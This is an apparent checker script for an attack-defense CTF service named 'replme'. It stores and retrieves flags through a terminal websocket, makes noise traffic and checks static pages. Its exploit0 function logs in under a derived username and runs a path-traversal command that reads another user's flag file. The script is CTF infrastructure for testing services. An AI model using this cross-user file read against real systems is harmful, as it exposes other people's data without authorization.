import secrets
import re
from logging import LoggerAdapter

from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import assert_equals
from httpx import AsyncClient
import base64

from exploit import exploit0_apply_delta
from noise import get_noise, get_random_noise
from util import (
    create_user,
    do_user_login,
    get_sessions,
    terminal_websocket,
    user_login,
)

checker = Enochecker("replme", 6969)


def app():
    return checker.app


@checker.putflag(0)
async def putflag0(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    (username, password, cookies, replUuid) = await create_user(client, db, logger)
    flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8")
    await terminal_websocket(
        task.address,
        logger,
        cookies,
        replUuid,
        [
            (f'echo "{flag}" > flagstore.txt && echo OK\n', ".*\nOK.*"),
        ],
    )

    return username


@checker.getflag(0)
async def getflag0(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    (_, _, cookies, replUuid) = await user_login(client, db, logger)
    flag = (
        base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace("+", "\\+")
    )
    try:
        await terminal_websocket(
            task.address,
            logger,
            cookies,
            replUuid,
            [
                ("cat flagstore.txt\n", f".*\n{flag}.*"),
            ],
        )
    except TimeoutError:
        raise MumbleException("Flag was not found")


@checker.exploit(0)
async def exploit0(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    target_username = task.attack_info

    if target_username is None:
        raise MumbleException("No attack_info")

    logger.info("Exploit: " + target_username)

    if len(target_username) != 60:
        raise MumbleException("Incorrect attack_info username length")

    delta_username = exploit0_apply_delta(target_username)

    logger.info("Delta username: " + delta_username)

    password = secrets.token_hex(30)

    (cookies, replUuid) = await do_user_login(client, logger, delta_username, password)
    response = await terminal_websocket(
        task.address,
        logger,
        cookies,
        replUuid,
        [
            (
                f"echo FLAG && cat ../{target_username}/flagstore.txt && echo OK\n",
                ".*\nOK.*",
            ),
        ],
    )

    match = re.findall(r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK", response)
    if len(match) == 0:
        return None

    flag = base64.b64decode(match[0]).decode("utf-8")
    return flag


@checker.putnoise(0)
async def putnoise0(
    task: PutnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    (_, _, cookies, replUuid) = await create_user(client, db, logger)
    sessions = await get_sessions(client, cookies, logger)
    assert_equals(len(sessions) > 0, True, "No session created")

    (i, noise) = get_random_noise()
    await terminal_websocket(
        task.address,
        logger,
        cookies,
        replUuid,
        noise[0],
    )

    await db.set("noise_id", i)


@checker.getnoise(0)
async def getnoise0(
    task: GetnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    (_, _, cookies, replUuid) = await user_login(client, db, logger)
    sessions = await get_sessions(client, cookies, logger)
    assert_equals(len(sessions) > 0, True, "No session created")
    i = await db.get("noise_id")
    if not isinstance(i, int):
        raise MumbleException("noise_id is not a int: " + str(i))
    noise = get_noise(i)
    await terminal_websocket(
        task.address,
        logger,
        cookies,
        replUuid,
        noise[1],
    )


@checker.havoc(0)
async def havoc0(
    task: HavocCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    assert_equals(
        (await client.get("/", follow_redirects=True)).status_code < 300,
        True,
        "Failed to get index.html",
    )
    assert_equals(
        (await client.get("/static/js/index.js", follow_redirects=True)).status_code
        < 300,
        True,
        "Failed to get index.js",
    )
    assert_equals(
        (await client.get("/term", follow_redirects=True)).status_code < 300,
        True,
        "Failed to get term.html",
    )
    assert_equals(
        (await client.get("/static/js/term.js", follow_redirects=True)).status_code
        < 300,
        True,
        "Failed to get term.js",
    )
    assert_equals(
        (await client.get("/static/css/style.css", follow_redirects=True)).status_code
        < 300,
        True,
        "Failed to get style.css",
    )
    assert_equals(
        (await client.get("/static/css/xterm.css", follow_redirects=True)).status_code
        < 300,
        True,
        "Failed to get xterm.css",
    )


if __name__ == "__main__":
    checker.run()
